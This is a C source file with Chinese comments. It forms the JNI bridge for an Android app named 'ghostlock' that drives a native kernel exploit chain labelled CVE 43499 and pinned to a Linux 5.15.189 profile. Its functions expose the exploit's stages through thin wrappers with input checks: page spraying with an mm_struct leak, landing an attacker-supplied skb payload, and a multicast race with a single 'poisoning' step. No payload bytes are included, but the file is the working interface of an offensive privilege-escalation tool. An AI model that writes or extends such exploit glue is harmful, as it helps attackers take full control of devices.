/**
 * @file jni43499.c
 * @brief `com.ghostlock.app.jni.Native43499Jni` 的 JNI 边界（DSO `ghostlock43499`）。
 *
 * 本文件只做三件事：JNI 参数校验、把 Kotlin 的标量搬进 `core/api.h`、把结果原样
 * 带回。策略、步骤、判定全部在 Kotlin（`Native43499Jni` + `Cve43499BackendPort`）；
 * 攻击原语在 `core/`。
 *
 * @note 会话是**单例**（`glk43499_api_create` 幂等失败返回 `-EALREADY`），句柄因此
 *       没有实质内容；Kotlin 侧仍按"句柄"使用，等 P3 多实例落地后改为真句柄。
 * @note 所有调用都是阻塞的，且 `discover → land → (execute)` 之间不允许有其它写：
 *       Kotlin 必须在同一后台线程上顺序调用。
 * @note 失败语义：`discover`/`land` 返回 0 表示失败；`runMulticast`/`executeMulticast`
 *       返回 0 表示未写入，具体可读 `lastStep`/`lastErrno`。
 */
#include <jni.h>

#include <stdint.h>

#include "core/api.h"

/**
 * @brief 初始化单会话（装载写死的 5.15.189 dev profile）。
 *
 * @return 0 成功；负数为 `-errno`。
 * @note profile blob 契约落地前，这里不接受配置参数。
 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_create(JNIEnv *env, jclass clazz) {
    (void) env;
    (void) clazz;
    return (jint) glk43499_api_create();
}

/**
 * @brief 喷页 + 泄漏。
 *
 * @param target 目标地址的 direct-map 别名。
 * @return `mm_struct`；0 表示失败。
 */
JNIEXPORT jlong JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_discover(JNIEnv *env, jclass clazz,
                                                   jlong target) {
    (void) env;
    (void) clazz;
    if (target <= 0) return 0;
    return (jlong) glk43499_api_discover((uint64_t) target);
}

/**
 * @brief 用 `mm_struct` 落页。
 *
 * @param mmStruct [discover] 的返回值。
 * @param target   与 [discover] 相同的目标地址。
 * @return 页基址；0 表示拒绝或失败。
 */
JNIEXPORT jlong JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_land(JNIEnv *env, jclass clazz,
                                               jlong mmStruct, jlong target) {
    (void) env;
    (void) clazz;
    if (mmStruct <= 0 || target <= 0) return 0;
    return (jlong) glk43499_api_land((uint64_t) mmStruct, (uint64_t) target);
}

/**
 * @brief 与 [land] 相同，但页载荷字节由 Kotlin 提供。
 *
 * @param mmStruct    [discover] 的返回值。
 * @param target      与 [discover] 相同的目标地址。
 * @param skbPayload  全量页载荷；长度必须等于 native 的 `SKB_SEND_SIZE`。
 * @return 页基址；0 表示拒绝（长度不符 / 页被拒收 / 地址不匹配）。
 */
JNIEXPORT jlong JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_landWithPayload(JNIEnv *env, jclass clazz,
                                                         jlong mmStruct, jlong target,
                                                         jbyteArray skbPayload) {
    (void) clazz;
    if (mmStruct <= 0 || target <= 0 || skbPayload == NULL) return 0;
    const jsize len = (*env)->GetArrayLength(env, skbPayload);
    if (len <= 0) return 0;
    jbyte *bytes = (*env)->GetByteArrayElements(env, skbPayload, NULL);
    if (bytes == NULL) return 0;
    /* 拷贝在调用前完成：plant→arm 窗口内不允许任何 syscall / JNI 动作。 */
    const uint64_t base = glk43499_api_land_with_payload(
        (uint64_t) mmStruct, (uint64_t) target,
        (const uint8_t *) bytes, (size_t) len);
    (*env)->ReleaseByteArrayElements(env, skbPayload, bytes, JNI_ABORT);
    return (jlong) base;
}

/**
 * @brief select 物理入口（保留面占位）。
 *
 * @return `-ENOSYS`：该 route 无自有真机门禁，未证明前拒绝。
 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_executeSelect(JNIEnv *env, jclass clazz,
                                                        jlong target) {
    (void) env;
    (void) clazz;
    if (target <= 0) return 0;
    return (jint) glk43499_api_execute_select((uint64_t) target);
}

/**
 * @brief tcp 物理入口（保留面占位）。
 *
 * @return `-ENOSYS`：同上。
 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_executeTcp(JNIEnv *env, jclass clazz,
                                                     jlong target) {
    (void) env;
    (void) clazz;
    if (target <= 0) return 0;
    return (jint) glk43499_api_execute_tcp((uint64_t) target);
}

/**
 * @brief 执行已落页的 multicast 单发（PI 三线程 + 一次下毒）。
 *
 * @param target 目标地址。
 * @return 1 成功；0 失败（配合 [lastStep]/[lastErrno]）。
 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_executeMulticast(JNIEnv *env,
                                                           jclass clazz,
                                                           jlong target) {
    (void) env;
    (void) clazz;
    if (target <= 0) return 0;
    return (jint) glk43499_api_execute_mcast((uint64_t) target);
}

/**
 * @brief 一次完整写：discover + land + multicast 单发。
 *
 * @param target 目标地址。
 * @return 1 成功；0 失败。
 * @note 供"单入口"对拍使用；生产由 Kotlin 分步驱动。
 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_runMulticast(JNIEnv *env, jclass clazz,
                                                       jlong target) {
    (void) env;
    (void) clazz;
    if (target <= 0) return 0;
    return (jint) glk43499_api_run_mcast((uint64_t) target);
}

/** @brief 页载荷要求的字节数（Kotlin 构造时用）。 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_skbPayloadSize(JNIEnv *env, jclass clazz) {
    (void) env;
    (void) clazz;
    return (jint) glk43499_api_skb_payload_size();
}

/** @brief 最近一次 route step（0 = 无失败）。 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_lastStep(JNIEnv *env, jclass clazz) {
    (void) env;
    (void) clazz;
    return (jint) glk43499_api_last_step();
}

/** @brief 最近一次 errno（0 = 无失败）。 */
JNIEXPORT jint JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_lastErrno(JNIEnv *env, jclass clazz) {
    (void) env;
    (void) clazz;
    return (jint) glk43499_api_last_errno();
}

/** @brief 释放会话（幂等）。 */
JNIEXPORT void JNICALL
Java_com_ghostlock_app_jni_Native43499Jni_close(JNIEnv *env, jclass clazz) {
    (void) env;
    (void) clazz;
    glk43499_api_close();
}
